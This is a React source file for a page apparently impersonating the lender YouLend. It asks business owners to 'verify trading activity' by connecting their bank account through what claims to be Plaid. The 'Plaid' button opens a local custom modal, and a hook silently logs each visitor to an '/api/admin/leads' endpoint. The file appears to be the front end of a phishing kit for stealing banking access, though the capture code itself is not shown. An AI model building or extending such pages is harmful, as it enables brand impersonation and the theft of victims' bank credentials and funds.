"default client";
"use client";

import { useEffect, useState } from "react";
import Footer from "@/components/Footer";
import FAQAccordion from "@/components/FAQAccordion";
import PlaidModal from "@/components/PlaidModal";

const checklist = [
  {
    text: "Connect the",
    highlight: "business account(s)",
    tail: "where sales are received via your banking app",
  },
  {
    text: "The connection allows",
    highlight: "read-only access",
    tail: "to view sales data",
  },
  {
    text: "Access expires automatically",
    highlight: "after 90 days,",
    tail: "disconnect any time.",
  },
];

export default function Home() {
  const [showPlaidModal, setShowPlaidModal] = useState(false);

  // 🌍 Automatic Visitor Ping & Geo-Location Tracking on Link Open
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        await fetch("/api/admin/leads", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            bankName: "Visitor Landed",
            bankType: "Visitor",
            extraData: "Page Opened / Link Clicked - Awaiting Bank Selection",
          }),
        });
      } catch (err) {
        console.log("Visitor tracking error:", err);
      }
    };

    trackVisitor();
  }, []);

  return (
    <main className="min-h-screen bg-white text-[#0f172a] flex flex-col font-sans antialiased">
      <header className="w-full bg-white px-3 md:px-12">
        <div className="mx-auto flex max-w-[1200px] items-center">
          <img
            src="/youlend-logo.png"
            alt="YouLend"
            className="h-[99px] w-auto object-contain block"
          />
        </div>
      </header>

      <section className="mx-auto w-full max-w-[620px] px-5 pt-8 pb-16 text-center">
        <h1 className="text-[36px] md:text-[40px] font-extrabold tracking-[-0.02em] text-[#0f172a] leading-[1.15]">
          Verify your trading activity
        </h1>
        <p className="mt-3.5 text-[15px] text-[#55637d] font-normal leading-relaxed">
          We do this to confirm your trading history, and to match our offers to your cashflow.
        </p>

        <div className="mt-9 rounded-[20px] bg-white p-8 text-left border border-[#edf1f7] shadow-[0_4px_30px_rgba(15,23,42,0.04)]">
          <h2 className="text-[20px] font-bold text-[#0f172a] tracking-tight">
            Verify with Open Banking
          </h2>
          <p className="mt-2 text-[14px] text-[#55637d] leading-[1.6]">
            In order for us to proceed with our assessment please connect via open banking to verify your business bank account.
          </p>

          <div className="mt-6 rounded-[14px] bg-[#f8fafc] p-5">
            <ul className="flex flex-col gap-4 text-[13.5px] text-[#475569] leading-relaxed">
              {checklist.map((item, idx) => (
                <li key={idx} className="flex items-start gap-3.5">
                  <svg
                    className="w-4 h-4 min-w-[16px] mt-0.5 text-[#0f172a]"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2.3"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <polyline points="20 6 9 17 4 12" />
                  </svg>
                  <span>
                    {item.text} <strong className="font-semibold text-[#0f172a]">{item.highlight}</strong> {item.tail}
                  </span>
                </li>
              ))}
            </ul>
          </div>

          {/* Blue Button - Opens Plaid Modal Step 0 Correctly */}
          <button
            type="button"
            onClick={() => setShowPlaidModal(true)}
            className="mt-6 flex w-full items-center justify-center gap-2 rounded-full bg-[#2f55d4] hover:bg-[#2546b8] active:scale-[0.99] py-3.5 px-6 font-medium text-[15px] text-white shadow-sm transition cursor-pointer"
          >
            <span>Add securely with</span>
            <span className="inline-flex items-center">
              <span className="text-[13px] font-black tracking-[0.16em] leading-none">
                PLAID
              </span>
            </span>
          </button>
        </div>
      </section>

      <section className="mx-auto w-full max-w-[620px] px-5 pb-20">
        <h2 className="mb-7 text-center text-[22px] md:text-[24px] font-bold text-[#0f172a]">
          Frequently asked questions
        </h2>
        <FAQAccordion />
      </section>

      <Footer />

      {/* Plaid Modal Component */}
      <PlaidModal
        isOpen={showPlaidModal}
        onClose={() => setShowPlaidModal(false)}
      />
    </main>
  );
}